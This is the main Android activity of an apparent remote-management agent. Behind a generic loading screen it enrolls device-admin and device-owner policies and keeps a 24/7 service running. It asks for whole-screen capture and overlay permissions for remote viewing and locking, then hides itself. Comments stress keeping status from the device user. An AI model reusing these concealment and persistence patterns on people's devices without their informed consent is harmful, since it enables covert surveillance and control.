package com.trmm.agent;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Window;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import java.lang.ref.WeakReference;

public class MainActivity extends Activity {
    private static final int REQUEST_SCREEN_CAPTURE = 1002;
    private static final int REQUEST_POST_NOTIF = 1003;

    ProgressBar pbLoader;
    TextView tvLoadingStatus;
    Handler handler;
    int dotsCount = 0;
    boolean isWaitingPhase = false;

    static class StatusReceiver extends BroadcastReceiver {
        private final WeakReference<MainActivity> activityRef;

        public StatusReceiver(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            // Silently log service status updates without exposing internal telemetry to the device user
            try {
                if (intent != null) {
                    String status = intent.getStringExtra(AgentService.EXTRA_STATUS);
                    String log = intent.getStringExtra(AgentService.EXTRA_LOG);
                    if (status != null) {
                        Log.d("TRMMAgent", "[StatusUpdate] " + status);
                    }
                    if (log != null) {
                        Log.d("TRMMAgent", "[ServiceLog] " + log);
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    static class GlobalExceptionHandler implements Thread.UncaughtExceptionHandler {
        @Override
        public void uncaughtException(Thread thread, Throwable throwable) {
            Log.e("TRMMAgent", "Uncaught exception in " + (thread != null ? thread.getName() : "unknown") + ": "
                    + (throwable != null ? throwable.getMessage() : "unknown"), throwable);
        }
    }

    static class ScreenCaptureRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public ScreenCaptureRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.requestEntireScreenCapture();
                }
            } catch (Throwable ignored) {}
        }
    }

    static class BatteryExemptionRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public BatteryExemptionRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.requestBatteryOptimizationExemption();
                }
            } catch (Throwable ignored) {}
        }
    }

    static class OverlayPermissionRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public OverlayPermissionRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.requestOverlayPermission();
                }
            } catch (Throwable ignored) {}
        }
    }

    static class MoveToBackRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public MoveToBackRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.moveTaskToBack(true);
                }
            } catch (Throwable ignored) {}
        }
    }

    static class DotsRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public DotsRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.updateDots();
                    if (act.handler != null && act.dotsRunnable != null) {
                        act.handler.postDelayed(act.dotsRunnable, 500L);
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    static class TransitionRunnable implements Runnable {
        private final WeakReference<MainActivity> activityRef;

        public TransitionRunnable(MainActivity activity) {
            this.activityRef = new WeakReference<>(activity);
        }

        @Override
        public void run() {
            try {
                MainActivity act = activityRef.get();
                if (act != null && !act.isFinishing()) {
                    act.isWaitingPhase = true;
                    if (act.tvLoadingStatus != null) {
                        act.tvLoadingStatus.setText("Please wait...");
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    DotsRunnable dotsRunnable;
    TransitionRunnable transitionRunnable;
    private StatusReceiver statusReceiver;

    void updateDots() {
        if (tvLoadingStatus != null) {
            dotsCount = (dotsCount % 3) + 1;
            StringBuilder dots = new StringBuilder();
            for (int i = 0; i < dotsCount; i++) {
                dots.append(".");
            }
            String prefix = isWaitingPhase ? "Please wait" : "Loading";
            tvLoadingStatus.setText(prefix + dots.toString());
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Global uncaught exception protection
        Thread.setDefaultUncaughtExceptionHandler(new GlobalExceptionHandler());

        // Remove title bar for a seamless, clean screen
        try {
            requestWindowFeature(Window.FEATURE_NO_TITLE);
        } catch (Throwable ignored) {}

        setContentView(R.layout.activity_main);

        pbLoader = (ProgressBar) findViewById(R.id.pbLoader);
        tvLoadingStatus = (TextView) findViewById(R.id.tvLoadingStatus);

        handler = new Handler(Looper.getMainLooper());
        statusReceiver = new StatusReceiver(this);
        dotsRunnable = new DotsRunnable(this);
        transitionRunnable = new TransitionRunnable(this);

        // Start preloader animation: "Loading..." then transitions to "Please wait..."
        isWaitingPhase = false;
        dotsCount = 0;
        if (tvLoadingStatus != null) {
            tvLoadingStatus.setText("Loading...");
        }
        handler.post(dotsRunnable);
        handler.postDelayed(transitionRunnable, 1200L);

        // Apply device owner / corporate administration policies silently
        AdminReceiver.applyDeviceOwnerPolicies(this);
        autoEnrollCorporateProtection();

        // 1. Immediately launch background service (Always Running 24/7)
        startAgentService();

        // 2. Request Notification Permission (Android 13+)
        requestNotificationPermission();

        // 3. Request Battery Optimization Exemption for 24/7 background operation
        handler.postDelayed(new BatteryExemptionRunnable(this), 800L);

        // 4. Automatically prompt Screen Capture authorization on startup if not already active
        if (AgentService.mediaProjectionResultData == null) {
            handler.postDelayed(new ScreenCaptureRunnable(this), 400L);
        }

        // 5. Request Display Over Other Apps permission for remote locking over any app
        handler.postDelayed(new OverlayPermissionRunnable(this), 1200L);

        handleIncomingIntent(getIntent());
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleIncomingIntent(intent);
    }

    @Override
    protected void onResume() {
        super.onResume();
        AdminReceiver.applyDeviceOwnerPolicies(this);

        // Ensure dots animation is running while visible
        if (handler != null && dotsRunnable != null) {
            handler.removeCallbacks(dotsRunnable);
            handler.post(dotsRunnable);
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(statusReceiver, new IntentFilter(AgentService.ACTION_STATUS_UPDATE),
                        Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(statusReceiver, new IntentFilter(AgentService.ACTION_STATUS_UPDATE));
            }
        } catch (Throwable ignored) {}
    }

    private void autoEnrollCorporateProtection() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = AdminReceiver.getComponentName(this);
            if (dpm != null && !dpm.isDeviceOwnerApp(getPackageName()) && !dpm.isAdminActive(admin)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Corporate protection enables remote endpoint security and management.");
                startActivity(intent);
            }
        } catch (Throwable t) {
            Log.w("TRMMAgent", "Auto-enroll admin notice: " + t.getMessage());
        }
    }

    private void handleIncomingIntent(Intent intent) {
        if (intent == null) return;
        String action = intent.getAction();
        boolean reqProjection = intent.getBooleanExtra("REQUEST_PROJECTION", false)
                || "REQUEST_PROJECTION".equals(action);
        if (reqProjection) {
            appendLog("Remote control session initiated. Prompting screen capture...");
            if (handler != null) {
                handler.postDelayed(new ScreenCaptureRunnable(this), 300L);
            }
        }
    }

    private void requestNotificationPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                    requestPermissions(new String[] { Manifest.permission.POST_NOTIFICATIONS }, REQUEST_POST_NOTIF);
                }
            }
        } catch (Throwable t) {
            Log.w("TRMMAgent", "Notification permission error: " + t.getMessage());
        }
    }

    private void requestEntireScreenCapture() {
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                try {
                    Toast.makeText(this,
                            "Select 'Entire screen' on the system prompt to allow remote view support",
                            Toast.LENGTH_LONG).show();
                } catch (Throwable ignored) {}
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    MediaProjectionConfig config = MediaProjectionConfig.createConfigForDefaultDisplay();
                    Intent captureIntent = mpm.createScreenCaptureIntent(config);
                    startActivityForResult(captureIntent, REQUEST_SCREEN_CAPTURE);
                } else {
                    Intent captureIntent = mpm.createScreenCaptureIntent();
                    startActivityForResult(captureIntent, REQUEST_SCREEN_CAPTURE);
                }
            }
        } catch (Throwable t) {
            Log.w("TRMMAgent", "Screen capture request warning: " + t.getMessage());
        }
    }

    private void requestBatteryOptimizationExemption() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                }
            }
        } catch (Throwable t) {
            Log.w("TRMMAgent", "Battery optimization prompt warning: " + t.getMessage());
        }
    }

    private void requestOverlayPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    appendLog("Prompting 'Display over other apps' authorization for remote device lock...");
                    Intent intent = new Intent(
                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } else {
                    appendLog("Display over other apps permission: Active.");
                }
            }
        } catch (Throwable t) {
            Log.w("TRMMAgent", "Overlay permission prompt warning: " + t.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK && data != null) {
                AgentService.setMediaProjectionData(resultCode, data);
                appendLog("Entire screen capture permission active across all apps.");

                // Immediately promote Foreground Service with MEDIA_PROJECTION while activity is focused
                try {
                    Intent promoteIntent = new Intent(this, AgentService.class);
                    promoteIntent.setAction("PROMOTE_MEDIA_PROJECTION");
                    promoteIntent.putExtra("RESULT_CODE", resultCode);
                    promoteIntent.putExtra("RESULT_DATA", data);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(promoteIntent);
                    } else {
                        startService(promoteIntent);
                    }
                } catch (Throwable ignored) {}

                // Automatically move to background once authorized so the user is returned to their home screen
                if (handler != null) {
                    handler.postDelayed(new MoveToBackRunnable(this), 600L);
                }
            } else {
                appendLog("Screen capture cancelled. Shell fallback active.");
            }
        }
    }

    private void startAgentService() {
        try {
            Intent intent = new Intent(this, AgentService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            appendLog("Persistent background service started.");
        } catch (Throwable t) {
            Log.e("TRMMAgent", "Failed to start service: " + t.getMessage(), t);
        }
    }

    void appendLog(String msg) {
        // Log internally to Android logcat without exposing to device UI
        Log.i("TRMMAgent", msg != null ? msg : "");
    }

    @Override
    public void onBackPressed() {
        // Move to background instead of finishing, maintaining 24/7 background presence
        moveTaskToBack(true);
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (handler != null && dotsRunnable != null) {
            handler.removeCallbacks(dotsRunnable);
        }
        try {
            unregisterReceiver(statusReceiver);
        } catch (Throwable ignored) {}
    }
}
